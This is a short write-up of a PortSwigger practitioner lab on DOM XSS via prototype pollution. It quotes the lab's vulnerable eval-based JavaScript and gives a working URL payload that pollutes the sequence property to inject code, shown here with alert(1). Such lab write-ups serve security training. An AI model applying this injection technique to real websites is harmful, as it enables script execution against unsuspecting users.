# [DOM XSS via an alternative prototype pollution vector] — [PortSwigger] — [Practitioner]
**Date:** 2026-07-31
 
---
 
## Vulnerability / core concept
DOM XSS via Prototype Pollution

---


## Payload / key command
I solved this lab manually without DOM Invader.

To solve this, we can look up in the `Sources` in developer tools for `searchLoggerAlternative.js` file. There we can see the following code snippet:
```js
async function searchLogger() {
    window.macros = {};
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}
```
As we can see, this code checks whether `manager.sequence` exists or not before continuing. That means there is a chance that we can change the value of it through prototype pollution. To do so, I tried to inject prototype pollution through URI in `__proto__[property]=value` format. After doing so, I checked the `Object.prototype` in Console and saw that our polluiton worked! Now, all we need to do is to assign a payload that is adjusted to this code without breaking the syntax of it.

This is my final payload:
```js
/?__proto__.sequence=alert(1))};%20//
```
Here, we are closing the brackets and braces to keep syntax correct and add `//` to comment out everything after our payload.


